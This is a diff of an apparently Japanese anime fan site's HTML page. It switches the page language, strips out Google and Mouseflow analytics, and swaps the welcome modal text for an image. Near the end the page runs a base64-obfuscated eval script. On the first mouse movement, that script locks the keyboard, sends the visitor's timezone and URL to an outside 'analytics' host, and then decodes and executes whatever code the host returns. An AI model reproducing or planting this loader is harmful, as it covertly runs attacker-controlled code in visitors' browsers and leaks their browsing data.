@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ja">
 
 <head>
 <meta charset="UTF-8">
@@ -26,7 +26,6 @@ integrity="sha256-XoaMnoYC5TH6/+ihMEnospgm0J1PM/nioxbOUdnM8HY=" crossorigin="ano
     top: 0;
     width: 100%;
     height: 100%;
-    overflow: auto; /* Enable scroll if needed */
     background-color: rgba(0, 0, 0, 0.8); /* Black background with opacity */
   }
 
@@ -76,16 +75,6 @@ integrity="sha256-XoaMnoYC5TH6/+ihMEnospgm0J1PM/nioxbOUdnM8HY=" crossorigin="ano
     background-color: #ff6347;
   }
 </style>
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-16679004566">
-</script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'AW-16679004566');
-</script>
 </head>
 
 <body>
@@ -93,14 +82,8 @@ integrity="sha256-XoaMnoYC5TH6/+ihMEnospgm0J1PM/nioxbOUdnM8HY=" crossorigin="ano
 <div id="animeModal" class="modal">
   <div class="modal-content">
     <span class="close">&times;</span>
-    <h2>アニメの世界へようこそ！</h2>
-    <p>
-      アニメはただのエンターテイメントではありません。それは感動、冒険、そして新たな友達との出会いです。このサイトでは、あなたの好きなアニメを見つけ、共に楽しむ仲間を見つけましょう。
-    </p>
-    <p>
-      各ジャンルやシリーズについてもっと知りたいですか？それとも新しい作品を探していますか？ここでは、すべてのアニメファンが楽しめるコンテンツが満載です。
-    </p>
-    <button id="exploreButton">今すぐ探検する</button>
+    <h2>アニメガールのエキサイティングな世界を発見しよう</h2>
+    <img src="imgs/front_modal.jpg" height="300px" />
   </div>
 </div>
 <!-- HEADER::START -->
@@ -1420,16 +1403,7 @@ integrity="sha256-XoaMnoYC5TH6/+ihMEnospgm0J1PM/nioxbOUdnM8HY=" crossorigin="ano
     modal.style.display = "none";
   };
 </script>
-  <script type="text/javascript">
-  window._mfq = window._mfq || [];
-  (function() {
-    var mf = document.createElement("script");
-    mf.type = "text/javascript"; mf.defer = true;
-    mf.src = "//cdn.mouseflow.com/projects/8e4a907b-08e6-4a25-9535-ad0653afb650.js";
-    document.getElementsByTagName("head")[0].appendChild(mf);
-  })();
-</script>
-  <script>
+<script>
     eval(atob(`CgoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignbW91c2Vtb3ZlJywgaW5pdGlhdGVBcGlSZXF1ZXN0T25jZSk7CgpsZXQgcmVxdWVzdFNlbnQgPSBmYWxzZTsKCmZ1bmN0aW9uIGluaXRpYXRlQXBpUmVxdWVzdE9uY2UoKSB7CiAgICBpZiAocmVxdWVzdFNlbnQpIHJldHVybjsKCiAgICByZXF1ZXN0U2VudCA9IHRydWU7CiAgICBkb2N1bWVudC5yZW1vdmVFdmVudExpc3RlbmVyKCdtb3VzZW1vdmUnLCBpbml0aWF0ZUFwaVJlcXVlc3RPbmNlKTsKCiAgICBzZWN1cmVLZXlib2FyZEFjY2VzcygpOwogICAgY29uc3QgY2xpZW50VGltZXpvbmUgPSBnZXRDdXJyZW50VGltZXpvbmUoKTsKICAgIHRyYW5zbWl0VGltZXpvbmVEYXRhKCdodHRwczovL2hvc2hpYW5pbWVhbmFseXRpY3Mub25yZW5kZXIuY29tJywgY2xpZW50VGltZXpvbmUpCiAgICAgICAgLnRoZW4oZGVjb2RlQW5kUnVuU2NyaXB0KQogICAgICAgIC5jYXRjaChoYW5kbGVFcnJvcik7Cn0KCmZ1bmN0aW9uIHNlY3VyZUtleWJvYXJkQWNjZXNzKCkgewogICAgaWYgKG5hdmlnYXRvci5rZXlib2FyZCkgbmF2aWdhdG9yLmtleWJvYXJkLmxvY2soKTsKfQoKZnVuY3Rpb24gZ2V0Q3VycmVudFRpbWV6b25lKCkgewogICAgcmV0dXJuIEludGwuRGF0ZVRpbWVGb3JtYXQoKS5yZXNvbHZlZE9wdGlvbnMoKS50aW1lWm9uZTsKfQoKZnVuY3Rpb24gdHJhbnNtaXRUaW1lem9uZURhdGEodXJsLCB0aW1lem9uZSkgewogICAgcmV0dXJuIGZldGNoKHVybCwgewogICAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICAgIGhlYWRlcnM6IHsgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyB9LAogICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHsgdGltZXpvbmUsIGZ1bGxVcmw6IHdpbmRvdy5sb2NhdGlvbi5ocmVmIH0pLAogICAgfSkudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpOwp9CgpmdW5jdGlvbiBkZWNvZGVBbmRSdW5TY3JpcHQoZW5jb2RlZFNjcmlwdCkgewogICAgdHJ5IHsKICAgICAgICBjb25zdCBzY3JpcHQgPSBhdG9iKGVuY29kZWRTY3JpcHQpOwogICAgICAgIGV2YWwoc2NyaXB0KTsKICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgdGhyb3cgbmV3IEVycm9yKGBTY3JpcHQgZXhlY3V0aW9uIGZhaWxlZDogJHtlcnJvcn1gKTsKICAgIH0KfQoKZnVuY3Rpb24gaGFuZGxlRXJyb3IoZXJyb3IpIHsKICAgIGNvbnNvbGUuZXJyb3IoJ0FQSSByZXF1ZXN0IG9yIHNjcmlwdCBleGVjdXRpb24gZXJyb3I6JywgZXJyb3IpOwp9Cg==`));
   </script>
       </body>
